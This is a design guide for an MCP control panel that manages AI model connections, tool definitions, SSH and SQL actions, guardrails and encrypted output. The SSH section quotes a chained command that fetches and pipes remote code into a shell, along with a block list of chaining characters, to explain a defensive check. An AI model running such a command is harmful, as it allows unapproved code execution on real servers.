# MCP Panel — Application Guide

A control panel built on Bootstrap 5 / CoreUI. It is the **control plane** for the MCP
(Model Context Protocol) server: it manages AI model connections, tool definitions and the
server inventory, and it starts runs. The MCP server itself is a separate application
(Python); it reads the definitions kept here and exposes the tool surface.

> **Status:** the panel is one of six services. The data lives in `mcp-gateway`,
> authentication is real (JWT), and actions really run. `localStorage` holds nothing but
> the language and theme choice. For the full schema → `mcp-gateway/docs/DATABASE.md`

## The stack

| Service | Language | Job |
|---|---|---|
| `mcp-panel` | TypeScript / Next.js | This application — the control plane's interface |
| `mcp-gateway` | Java / Spring Boot | Owns the data, serves the REST API, writes queue results |
| `mcp-server` | Python / FastAPI | The MCP surface; plans, and has the model write the query or command |
| `mcp-action` | Go | The executor — SSH, database, REST; takes jobs off the queue |
| `mcp-cipher` | Go | Encryption; the one process holding the keys, over gRPC |
| `mcp-config` | Java / Spring Cloud Config | Central configuration, behind basic auth |

The panel reads its configuration from `mcp-config` (`lib/config/remote-config.ts`), on the
server and with credentials. Only the `panel.*` keys reach the browser, through
`/api/config` — `NEXT_PUBLIC_*` is not used, because those variables are baked into the
bundle at build time.

If the configuration cannot be read the panel runs on its built-in defaults and says so in
the banner at the top; it does not quietly look correct.

## A map of the concepts

```
AI model             claude-opus-5 @ https://api.anthropic.com + API key
   ▲
   │ modelId
Definition ────────  ONE tool, as the MCP server exposes it
   ├── toolName + toolDescription   → the tools/list response
   ├── system prompt                → the role given to the model
   ├── dynamic inputs[]             → the tool's input schema (JSON Schema)
   └── actions[]                    → REST | SSH | Database
                                       the model decides for itself which of
                                       these to call
         │
         └── SSH target → Host group (inventory)
```

The Python MCP server returns the enabled definitions when `tools/list` is called; when a
`tools/call` arrives it carries the work out using that definition's model, system prompt
and actions.

---

## Technology

| Layer | Choice |
|---|---|
| Framework | Next.js 16.3.1, App Router, Turbopack |
| UI | React 19.2 + CoreUI React 5.13 (MIT) + Bootstrap 5 CSS variables |
| Charts | chart.js + `@coreui/react-chartjs` |
| Icons | `@coreui/icons` |
| Fonts | Inter (interface), JetBrains Mono (code and addresses) |
| Language | TypeScript, `strict` |
| Tests | vitest + Testing Library (jsdom) — `npm test` |
| Interface languages | Turkish and English, client-side (no language prefix in the URL) |
| Storage | The data is in `mcp-gateway` (PostgreSQL + Redis); `localStorage` holds only language and theme |
| Configuration | `mcp-config`, behind basic auth, read on the server |

Tailwind was removed — it clashed with Bootstrap's preflight.

### CoreUI and Server Components

The `@coreui/react` package carries no `"use client"` directive. So every route follows this
shape:

```
app/(panel)/<route>/page.tsx      → Server Component, exports `metadata` only
components/<area>/<Name>View.tsx  → "use client", the whole interface lives here
```

---

## Routes

| Route | What it holds |
|---|---|
| `/` | Redirects to `/login` |
| `/login` | Two-column sign-in, validation, show/hide password |
| `/register` | Password strength meter, terms checkbox, success screen |
| `/dashboard` | Four stat cards, a line and a donut chart, the host table, an activity feed |
| `/models` | AI model records — provider, model id, endpoint, API key, request parameters |
| `/definitions` | The definition list; edit / duplicate / delete, enabled-disabled |
| `/definitions/new` | The new definition form |
| `/definitions/[id]` | Editing a definition (the same form) |
| `/host-groups` | The host group inventory; create / edit / delete |
| `/tools` | The tool surface, read-only — each definition as one MCP tool, with its JSON Schema |
| `/console` | Write a sentence, see which tool will do what; run it if you mean to, and get the result as a table |
| `/runs` | Run history; opening a row shows the statement that ran and its result |
| `/users` | The user table, role and status badges, the invite modal |
| `/logs` | Level tabs, search, tool filter, paging |
| `/settings` | Profile / Security / Notifications tabs |

The root `layout.tsx` applies the theme with an inline script before hydration, so switching
between light and dark produces no white flash.

---

## The central idea: a Definition

One definition = **one MCP tool**. It holds an **AI model**, a **system prompt**, a set of
**actions** and a set of **dynamic inputs**.

```
Definition
├── Tool name + description → the identity seen in the tools/list response
├── AI model (chosen)       → from the records on the /models page
├── System prompt (text)
├── Actions[]               → REST | SSH | Database
└── Dynamic inputs[]        → both the {{key}} placeholder
                               and the tool's input schema
```

### The tool's identity

`toolName` is derived from the definition's name as you type
(`Apache filo yönetimi` → `apache_filo_yonetimi`) but can be edited by hand; once it has
been, the automatic derivation stops. `toolDescription` is required — whether the calling
model picks the tool at the right moment depends on it.

### Inputs → JSON Schema

`toolInputSchema()` turns the dynamic inputs into the MCP tool's input schema:

| Input type | JSON Schema |
|---|---|
| `text`, `textarea` | `{"type": "string"}` |
| `number` | `{"type": "number"}` |
| `boolean` | `{"type": "boolean"}` |
| `date` | `{"type": "string", "format": "date"}` |
| `password` | `{"type": "string", "format": "password"}` — no default is written |
| `select` | `{"type": "string", "enum": [...]}` |

`required` is built from the inputs marked required, and `additionalProperties: false` is
fixed. The tools page shows each tool's complete JSON — usable as it stands on the Python
side.

### Dynamic inputs

Every input has a `key`, and it appears in an action's templates as `{{key}}`. It is filled
with a value at run time.

The types: `text`, `password`, `number`, `textarea`, `select`, `boolean`, `date`.

Every input also has a **source** — who is allowed to decide its value:

| Source | What it means |
|---|---|
| `prompt` | The model may read it out of the user's sentence |
| `caller` | Only the caller supplies it; the model does not fill this field |
| `fixed` | Whatever the default value is; it never appears in the tool's schema |

Type and source answer different questions: one says what the value looks like, the other
says who decides it. Confusing the two is the road to a model inventing a hostname.

- Keys are slugified as you type (`Sürüm Etiketi` → `surum_etiketi`).
- Duplicate or invalid keys are flagged on the form.
- A `select` takes a list of options.
- A `password` value is masked in the preview.

### Kinds of action

#### REST request
Method, URL, repeatable header rows, body (disabled for GET), timeout.

#### SSH command
It falls into three parts:

**Target**
- `single` — one address
- `list` — one address per line
- `group` — a group chosen from the inventory

When more than one target resolves, the strategy options appear:

| Strategy | Behaviour | Extra setting |
|---|---|---|
| `sequential` | One at a time | — |
| `parallel` | All at once | Concurrency limit |
| `rolling` | In batches | Batch size (the number of rounds is computed live) |

There is also a "stop at the first failure" switch.

**Connection and credentials** — port, user, working directory and the authentication
method:

| Method | Fields shown |
|---|---|
| `key` | Private key (PEM) + key passphrase |
| `password` | Password |
| `agent` | No fields, an information box |

A credential field can point at a dynamic input, such as `{{ssh_key}}` — and that is the
recommended use.

**Command**
- `static` — the command is written here, fixed; only `{{}}` is filled
- `dynamic` — the model writes the command; the guardrails are:
  - Allowed command prefixes (the written command must begin with one of them).
    A single line of `*` means "any command", leaving the blocked patterns and the refusal
    to chain. It is said in writing, not implied: letting an empty field mean "anything
    goes" would turn a forgotten field into an open door. Every run of an action that uses
    `*` says so in the console
  - **Chaining is refused** — `;` `&&` `||` `|` `>` `<` `` ` `` `$(` and newlines
  - Blocked patterns (refused even when the prefix is allowed)
  - Command guidance (free text instructions for the model)
  - Ask for approval / try a dry run first

Refusing to chain is what makes the prefix list mean anything. A prefix check looks at the
start of a string; with `sudo apt-get install -y python3` allowed, this used to pass:

```
sudo apt-get install -y python3; curl http://x | sh
```

The prefix was in order. What followed the semicolon was a second command nobody had
approved, and a blocked-pattern list only catches what somebody thought of. When a model
writes the command, an allow list that every punctuation mark walks around is decoration.

An operator who genuinely needs a pipeline writes it as a **static** command: the template
is theirs, and only the values put into it are checked. That is the line this module is
drawn along — what the operator wrote is trusted, what the model wrote is not. The job
carries which of the two it is (`authoredByModel`), because the same checks run a second
time in the executor.

#### Database query
Engine, address, port, database name, user and password. The password is stored encrypted
(→ [Secrets](#secrets)); the form only writes to it and never reads it.

The executor knows **`postgres`, `mysql`, `mssql` and `sqlite`**. SQLite is file-based: the
address and port fields are meaningless for it, and the path is carried in the `database`
field.

**MongoDB cannot be chosen.** Everything here is built around SQL — the allowed statements,
guardrails that look at a statement's first word, a schema read from `information_schema`,
and the instruction to the model to write a single SQL statement. Mongo would not be another
value in that list, it would be another kind of action; it is shown in the panel as it
stands, disabled.

- `static` — the query is written here, fixed
- `dynamic` — the model writes the query; the guardrails are:
  - **The tables whose schema is read** — an allow list. On "Read schema" the executor reads
    only these tables' real structure, and the result is written into the definition.
  - **Schema hint** — a note written by hand. When a schema has been read, that is the
    source of truth; the text here is given to the model as "the operator's note": what a
    column means, which table joins to what — the things that cannot be read out of a
    database.
  - Query guidance (`guidance`)
  - Allowed statements (SELECT / INSERT / UPDATE / DELETE)
  - Row ceiling, ask for approval

With "read only" switched on, the write statements are locked and drop automatically.

**No dynamic query is written without a schema.** With neither a read schema nor a
hand-written hint, the plan is refused without the model being asked at all. The reason is
measured: without a schema a model invents a table name, and the plan looks flawless.

##### Reading the schema

It goes over the queue: the gateway publishes the job, the executor reads
`information_schema`, and the answer comes back on another queue. Having sent the request
the panel asks for the definition once a second and updates the box in place when it fills —
being accepted and being answered are different things.

Two conditions: the definition must have been saved (the request is sent by id), and the
read uses the **saved** table list. Type a new table into the field and press the button
without saving, and the panel notices and says so.

### The preview

The preview under the form fills each action's template with the inputs' default values and
shows the result. **A secret never appears in the clear** — a credential field that is set
shows as `••••••••`, and an empty one as `—`.

```
# target: 10 hosts — web-01.internal, web-02.internal, web-03.internal … +7 hosts
# strategy: In batches (batches of 2, 5 rounds) · stop at the first failure
# credentials: SSH key ••••••••
ssh -i <private-key> deploy@<each host> -p 22
cd /
sudo systemctl restart apache2 && sleep 2 && systemctl is-active apache2
```

### Validation

Checked before saving:

- The definition name, the host selection and the system prompt cannot be empty
- At least one action is required
- Input keys must be unique and non-empty
- SSH: a target must be chosen; a static command must be filled in, a dynamic one needs an
  allow list
- DB: a static query must be filled in, a dynamic one needs at least one SQL statement
  selected

A `{{key}}` that appears in a template with no matching input raises a warning; it does not
block saving.

---

## The console: from a sentence to a result

The `/console` screen turns a sentence into a tool call. The chain:

```
sentence
  │
  ├─ (if no tool was chosen) the model picks one from the catalogue, or picks none
  │
  ├─ the definition's inputs are filled from the sentence   → mcp-server, PromptRouter
  │
  ├─ a plan is produced                                     → mcp-server, Planner
  │     for a dynamic action the model writes the query or
  │     command, which then goes through the guardrails
  │
  ├─ with "run the plan" ticked, it is written to the queue  → mcp.actions
  │
  ├─ the executor does the work                              → mcp-action
  │
  └─ the result comes back                                   → mcp.results, written by the gateway
```

Nothing runs unless it is ticked. Deciding what a sentence means and carrying it out are
different jobs, and a screen that did both at once would make the second one invisible.

The user's sentence is not only used to choose the tool — it is given to the model writing
the query as well. Without it, a definition with no inputs left the model looking at the
action's name alone, and it answered "the id and email of the last 3 records" with
`SELECT * FROM tblAccounts LIMIT 100`.

### The result

When a run finishes the console shows its status, the statement that ran and the output. A
query's result is drawn **as a table**: the rows are stored structured, not as aligned text.
A command's output appears as it is, in one piece.

Because the result arrives asynchronously off the queue, the panel asks about the run every
two seconds. There is no channel down to the browser, and for a job lasting a few seconds
asking is cheaper than building one.

### Output is stored sealed

The rows a query returns are production data. Stored in the clear, this database was turning
into a copy of the system it queried: asked once for "the first 100 users", the `PIN`,
`tckn`, `email` and `name` fields were written into `run_targets` as plain text and stayed
there indefinitely.

Output is now **sealed through mcp-cipher**. The text and the rows travel in one envelope,
in the `output_sealed` + `output_key_id` columns; the key lives outside this database, so a
copy of the database is not a copy of the data. The gateway opens the seal when reading, and
the panel sees no difference.

There are two deliberate exceptions:

- **A schema read is not sealed.** What comes back is a table definition, nobody's data, and
  the planner has to read it as plain text. The distinction is in the `runs.purpose` column.
- **`stderr_excerpt` is not sealed.** It is the explanation of a failure; the answer to "why
  did this not work" is in there, and an encrypted diagnostic field is of no use.

If sealing fails the output is **not written in the clear** — it is not written at all, and
the row says so. Falling back to plain text when the cipher is unreachable would mean the
protection quietly lapsing at exactly the moment something is already wrong.

### Conversation history

Console turns are stored in the gateway (`conversations`, `conversation_turns`). Leaving the
page does not end the conversation: an older one is opened from the list on the left and
carries on where it stopped. The reference of the last open conversation is kept in the
browser (`localStorage`) — the reference, not the conversation.

A conversation **belongs to its owner**; somebody else's comes back as "not found", and the
query itself is narrowed by user rather than checked afterwards with an `if`.

Turns keep no copy of the output. An executed turn holds a `run_ref` and the result is read
through `runs` — drawn by the same component the console uses. Two copies would mean two
places to look for personal data that has to be deleted.

### The conversation goes to the model too

Turns do not only sit on the screen; they **go to the model with the next question**.
Without that the console looked like a chat and was not: "and what about test.com?" reached
the model alone, with no sign of what it continued, and was either refused or answered as a
question nobody had asked.

The window is `mcp.conversation.thread-limit` turns (50 by default), from the config server.
Turns that fall out of it are not discarded but **folded into a summary**: the turns leaving
the window are given to the model along with the summary so far, and the text that comes
back is written to the conversation. Folding rather than re-reading the whole conversation
each time, so that the thousandth question costs what the fiftieth did.
`summarised_through_id` records how far the folding has reached, so no turn enters the
summary twice.

Summarising happens in batches (`summary-batch`, 10 by default). Updating the summary on
every turn that passed the window meant one model call per question for the oldest and least
consulted part of the conversation.

Result rows do not go to the model — only the questions and the statements that ran. "Do the
same for last month" is answered by seeing the query itself; seeing its rows does not answer
it better, and putting a result set into every later prompt would copy production data
somewhere new.

### One prompt, several steps

A goal can need more than one query. "First get the ones named ali, then get the ones named
veli as a separate table" produced only the `ali` query; its second half had to be typed
again as a separate question. The router picks one tool, that tool's action writes one
statement, and a guardrail refuses more than one statement in a single one — there was
nowhere for the goal to be split in two.

The loop advances **as results arrive**, not by waiting for them: a step cannot be decided
before the previous one has answered, and a prompt that waited for that would hold an HTTP
request open as long as the database. `GoalLoop.advance` is called once `RunResultListener`
has written the result.

A step produces its own sentence, not a plan. The sentence that comes back goes through the
ordinary prompt path: the same routing, the same planning, the same guardrails, the same
masking. The loop adds a decision, not a new way to reach a database.

A step is a turn, not a separate table. What the user sees is two consecutive turns anyway,
and putting them in separate structures would produce two different things drawn the same
way on screen. `conversation_turns.goal_turn_id` says which goal a turn continues.

The stopping rules are **in the code**, not in the model: the step budget (`goal-steps`), a
step that failed, work that was not a read. A loop that asks whether to continue can be told
yes forever; a loop that counts cannot.

The next step sees a **summary** of the one before it — the row count, the column names and
the first few rows. The summary is opened from the sealed output for that decision and is
not stored; storing it would bring back the arrangement the sealing ended.

### A repeated query is caught

Telling from the words alone when a prompt means "summarise the conversation" and when it
means "fetch data" is endless work: we named one phrasing in the router's prompt, and the
next day another arrived ("bring all previous results as a table"), re-ran a query from
seven turns earlier and presented its rows as all previous results.

So there is a deterministic check instead: if the written statement is identical to one
already in the window (ignoring whitespace, case and a trailing `;`) the turn is flagged
with a `repeats_earlier` warning. It is compared against all of them, not just the previous
one: a repeat is usually not of the last turn but of the one beyond a half-typed message or
a refusal.

There is also `request_as_value`: the model taking the whole sentence for a value instead of
reading one out of it. A half-sent message — "önceki t", an early Enter — became
`where email = 'önceki t'`; a query that ran, came back empty, and was reported as a
success. The invented-filter check cannot catch this, and naturally so: the value does
appear in the request, verbatim. That is the entire problem.

Warnings now travel as codes (`{code, detail}`) rather than sentences — the language of the
sentence is the panel's business.

### Questions that need no tool

Not everything typed into the console is a question about data. "What did I just run?",
"what does this query do", "why did it come back empty" — none of these needs a tool called,
and all of them can be answered from the conversation itself. Answering them with "no tool
matches" made the console useless for exactly the questions people ask it.

When no tool matches, the model answers directly. The answer travels in **its own field**
(`answer`) and is drawn differently on screen: "the model answered on its own — nothing was
run." A sentence about how many accounts there are reads exactly like a count of them; the
difference between the two is the difference between a fact and a guess, and the screen has
to carry it, because the words do not.

The model is told plainly: you reached nothing, you read nothing; you have this conversation
and what you already know. A question needing data nobody supplied is answered with "that
would need such-and-such run", not guessed at.

A question about the conversation **overrides** the follow-up rule. That distinction had to
be written down: after nine turns working properly, "could you list the results you have
brought me so far?" was routed to a tool and re-ran the previous SQL verbatim — a result
shaped like an answer that answered nothing. The test is whether what is being asked for is
*new* data. The same question with a different value → a tool. A question whose subject is
the conversation itself → no tool.

The model sees what was asked and the statements that ran; it **does not see the rows that
came back**, and it is asked to say so. Otherwise a list of six queries reads like a list of
six results — and the only thing worse than not having the rows is appearing to.

Questions that never reached an answer are kept too. "The MCP server was down when I asked
this" is what somebody coming back an hour later needs to see; a history that dropped them
would look as though the question had never been typed.

---

## AI models

The `/models` page holds the model connections that definitions talk to:

| Field | Description |
|---|---|
| Display name | The label shown in the panel |
| Provider | Anthropic, OpenAI-compatible, Azure, Vertex, Bedrock, Ollama, Custom |
| Model id | The identifier sent to the provider — `claude-opus-5` |
| Endpoint | The base URL; filled with a suggested value when a provider is chosen |
| API key | Entered masked, shown in the table as `sk-ant-…abcd` |
| `max_tokens` | The ceiling on a response |
| Timeout | Request timeout (ms) |

### Parameters that vary by provider

For Anthropic models, **`temperature` / `top_p` are not shown.** Sampling parameters were
removed in Claude 4.6 and later — sending them makes the request return `400`. Two fields
appear instead:

- **`effort`** — `low` / `medium` / `high` / `xhigh` / `max`. It sets how deeply the model
  thinks and how many tokens it spends in total; the default is `high`.
- **Adaptive thinking** — `thinking: {type: "adaptive"}`. It can be turned off, but that is
  not recommended.

For other providers the usual `temperature` field is shown in their place.

Before a model is deleted, the definitions using it are listed with links.

---

## Host groups

The inventory SSH actions target. Managed from the `/host-groups` page: a group name
(unique), a description, and one host address per line.

Before a group is deleted, the definitions targeting it are listed with links.

Adding a host to a group or removing one is reflected immediately in every definition that
uses it — `resolveTargets(action, groups)` takes the group list as a parameter rather than
being tied to a fixed one.

---

## Layout of the files

```
app/
├── layout.tsx                    root layout, theme script, fonts
├── globals.css                   brand variables, shell, sidebar, auth
├── page.tsx                      → redirect to /login
├── not-found.tsx
├── (auth)/
│   ├── layout.tsx                two-column shell + gradient panel
│   ├── login/page.tsx
│   └── register/page.tsx
└── (panel)/
    ├── layout.tsx                → PanelShell
    ├── dashboard/page.tsx
    ├── models/page.tsx
    ├── definitions/
    │   ├── page.tsx
    │   ├── new/page.tsx
    │   └── [id]/page.tsx
    ├── host-groups/page.tsx
    ├── tools/page.tsx
    ├── console/page.tsx
    ├── users/page.tsx
    ├── logs/page.tsx
    └── settings/page.tsx

api/
└── config/route.ts               the one endpoint passing panel.* keys to the browser

components/
├── PanelShell.tsx                sidebar + header + main + footer
├── AppSidebar.tsx                navigation, closes on mobile
├── AppHeader.tsx                 breadcrumb, search, notifications, theme, profile
├── AppFooter.tsx
├── PageHeader.tsx                title + description + action buttons
├── StatCard.tsx
├── ThemeToggle.tsx
├── dashboard/                    DashboardView, CallsChart, ModelMixChart
├── models/ModelsView.tsx
├── definitions/                  DefinitionsView, DefinitionForm,
│                                 ActionEditor, InputsEditor,
│                                 DefinitionCreateView, DefinitionEditView
├── host-groups/HostGroupsView.tsx
├── tools/                       ToolsView, ToolRunModal
├── console/                     ConsoleView, RunOutcome (the result table)
├── users/UsersView.tsx
├── logs/LogsView.tsx
├── settings/SettingsView.tsx
├── CommaListInput.tsx           a comma-separated list field
├── ResourceState.tsx            loading / error + retry / empty
├── Toaster.tsx                  operation notifications
├── ConfigWarning.tsx            the banner shown when configuration cannot be read
└── EnvironmentBadge.tsx

lib/
├── nav.ts                        menu structure, breadcrumb resolver
├── data.ts                       badge colours, label maps
├── definitions.ts                the type model, factories, template and JSON Schema builders
├── models-store.ts               AI model records (from the gateway)
├── definitions-store.ts          the definition store (from the gateway)
├── host-groups-store.ts          the inventory store (from the gateway)
├── api/
│   ├── client.ts                 fetch wrapper, token refresh
│   ├── endpoints.ts              the signature of every endpoint
│   ├── mappers.ts                server payload ↔ panel model
│   ├── types.ts                  the types of the server payloads
│   ├── errors.ts
│   ├── auth-store.ts, tools-store.ts, logs-store.ts
├── config/remote-config.ts       the mcp-config client (server-side only)
├── ui/
│   ├── toast-store.ts            the notification queue
│   └── announce.ts               a wrapper turning an operation's outcome into a notification
└── i18n/
    ├── locale-store.ts           the chosen language (localStorage)
    ├── tr.ts                     the Turkish dictionary — the source of the key set
    ├── en.ts                     the English dictionary — takes tr's type
    └── index.ts                  useT(), useIntlLocale()

tests/
├── setup.ts                      jest-dom, unmount after every test
├── CommaListInput.test.tsx
├── RunOutcome.test.tsx
└── RunsView.test.tsx
```

---

## Stores, and how they map to the schema

The panel's stores now call the gateway; the table below shows which store answers which
endpoint and which table.

| Panel store | Schema | Note |
|---|---|---|
| `models-store.ts` → `AiModel` | `ai_models` | `maxTokens`, `effort`, `thinking`, `temperature`, `timeoutMs` → `params` JSONB; `status`, `latencyMs`, `lastCheckedAt` → `health` JSONB |
| `definitions-store.ts` → `Definition` | `definitions` | `inputs[]` → `inputs` JSONB |
| `definitions-store.ts` → `Action` | `actions` | every type-specific field → `config` JSONB; `groupId` → the `host_group_id` column |
| `host-groups-store.ts` → `HostGroup` | `host_groups` | `hosts[]` → `hosts` JSONB |
| `data.ts` → `User` | `users` | `role` / `status` are already enum values (`admin`, `active` …) |
| `data.ts` → `LogEntry` | `tool_calls` | |
| `data.ts` → `Activity` | `audit_events` | |
| `i18n/locale-store.ts` | `users.preferences` | `{ "locale": "tr", "theme": "dark" }` |
| `api/runs-store.ts` → `/runs` | `runs`, `run_targets` | History, paged; opening a row shows the statement and the result |
| — (not in the panel) | `secrets` | The panel writes, never reads |
| — (not in the panel) | `api_keys`, `teams`, `user_invitations` | |

### Secrets

The panel **writes secrets and never reads them**. A value entered goes to the gateway, the
gateway has `mcp-cipher` seal it, and only the ciphertext and the id of the key that sealed
it are written to the database. The form field looks empty for a stored secret; the
placeholder is what tells "stored, leave it alone" from "there is none".

| Panel field | Schema counterpart |
|---|---|
| `AiModel.apiKey` | `ai_models.api_key_secret_id` → `secrets` |
| `DbAction.password` | `config.passwordSecretId` **or** `config.passwordInputKey` |
| `SshAction.privateKey` | `config.privateKeySecretId` / `privateKeyInputKey` |
| `SshAction.passphrase` | `config.passphraseSecretId` / `passphraseInputKey` |
| `SshAction.password` | `config.passwordSecretId` / `passwordInputKey` |

The second route — pointing at a `password`-typed dynamic input instead of keeping the
secret inside the definition — still stands, for secrets supplied at call time.

The encryption key exists only in the `mcp-cipher` process; it reaches neither the config
server nor the database. If the key is lost, every sealed value becomes unreadable and has
to be entered again — there is no way to bring them back.

### Validation the backend has to take on

Because the schema leans on JSONB, some rules stopped being database constraints. The
panel's form validation applies all of them; **they have to be repeated in the backend**:

- The shape of an input key (`^[a-z_][a-z0-9_]*$`) and its uniqueness within a definition
- A `password`-typed input having an empty default value
- With `commandMode = "static"` the command being filled in, and with
  `queryMode = "static"` the query
- With `targetMode = "single"` the address being filled in
- With `auth = "agent"` the credential fields being empty
- For every secret, `*SecretId` and `*InputKey` never being set at the same time
- With `readOnly = true` the allowed statements being limited to `["select"]`
- A GET request carrying no body

For the constraints that remain in the database → `mcp-gateway/docs/DATABASE.md` → "Business
rules embedded in the database"

---

## Localisation

The panel runs in Turkish and English. The choice does not appear in the URL; it is changed
in the **TR/EN** selector in the header and under Settings → Profile → Language, and stored
in `localStorage` (`mcp-locale`). With nothing stored, the browser's language is used.

```tsx
const t = useT();
t("models.title");                            // "AI Modelleri" / "AI Models"
t("action.ssh.serverCount", { count: 10 });   // "10 sunucu" / "10 hosts"
```

- `lib/i18n/tr.ts` is the source of the key set; `en.ts` takes its type
  (`Record<MessageKey, string>`), so **a missing or extra key is a compile error**. There are
  currently 647 keys in each.
- Numbers and dates are formatted as `tr-TR` / `en-US` through `useIntlLocale()`.
- `{{double braces}}` are treated as an escape, so text demonstrating the template syntax
  does not get caught by interpolation.
- **Hydration:** the language is held with `useSyncExternalStore`; the server always renders
  Turkish, and the stored language takes over after hydration. The inline script used for
  the theme would not be enough here — a theme is one attribute, a language is every text
  node.
- **The browser tab** follows the same arrangement. A route's `metadata.title` is rendered
  on the server, where the chosen language is not known, so an English panel drew an English
  page under a Turkish tab. `DocumentTitle` sets it from the breadcrumb once there is a
  browser to ask — one route, one name, and no chance of the tab and the heading
  disagreeing.

What is translated is the interface. Definition names, system prompt text, record messages
and user names are **data** — in a real deployment they come from the database, and they are
not translated.

---

## Theme

The brand colour changes in one place — `app/globals.css`:

```css
:root {
  --brand: #ea580c;        /* brick orange */
  --brand-rgb: 234, 88, 12;
  --brand-600: #c2410c;    /* hover */
}
```

Buttons, links, the active menu item, the progress bar and the sidebar's hover and active
states all derive from these. The `.auth-aside` gradient and the chart colours are set by
hand as well.

The sidebar's ground is a warm dark tone (`#1c1512`), chosen to sit with the orange.

Light and dark work through the `data-coreui-theme` attribute, and the preference is stored
under the `mcp-theme` key.

---

## Known limits

- **MongoDB cannot be run.** It is shown disabled in the panel; there is no counterpart for
  guardrails built around SQL, nor for reading a schema.
- **No read-only transaction on SQL Server.** The driver refuses the read-only transaction
  request, so the flag is dropped for that engine; what guarantees a read there is the
  guardrails' statement check and the rollback at the end — which is weaker.
- **No sealed header on a REST action.** The field exists in the job contract, and nothing
  in the panel fills it — a token written into a REST header stays in plain text.
- **Model connections are not tested.** The "Test connections" button is decorative;
  `ai_models.health` is not written.
- **There is no key rotation path.** `mcp-cipher` offers `Rewrap` and nothing calls it: when
  the key changes, the old sealed values — secrets, and now run output too — become
  unreadable.
- **The router model cannot be chosen from the panel.** Which model turns a sentence into a
  tool call lives in mcp-config (`config-repo/mcp-server.yml`), not in the panel like a
  definition's model — routing runs before any definition has been chosen, so there is no
  model to choose it from. Changing it means an edit on the config server and a restart of
  mcp-server.
- **The loop only reads.** A goal can be split across several queries; it cannot be split
  across commands. A loop that picks its own next command is a different thing from one that
  picks its own next query.
- **The step decision is not the same every time.** The same goal is sometimes split into
  two steps and sometimes the model decides one query was enough. All the code guarantees is
  the upper bound (`goal-steps`, 5 by default) and that a failed step ends the loop.
- **The narrowing warning does not know languages.** The check looks at whether a value
  appears in the request; "the distribution of active accounts" asks for exactly the
  `status = 'active'` filter it reports, in another language, and no text comparison can see
  that. So the screen does not claim, it asks: "these values do not appear in your request —
  did you mean them?"
- **The router's key is not sealed.** For the same reason: there is no definition to carry
  it. `ROUTER_API_KEY` sits in mcp-config's overrides in plain text and goes from there to
  every client.
- **There is no retention for output.** Sealed or not, `run_targets` accumulates without
  limit; nothing clears what has expired.
- **Rows written before migration 17 are in the clear.** Output written into the
  `result_rows` and `stdout_excerpt` columns before sealing stays there as plain text, and
  the read path still reads it.
- **Validation is client-side only.** The form rules are not database constraints for fields
  that go into JSONB; they have to be repeated in the backend —
  [the list](#validation-the-backend-has-to-take-on).
- **There is no model health history.** Neither the panel nor the schema keeps more than the
  last connection attempt (`ai_models.health`).
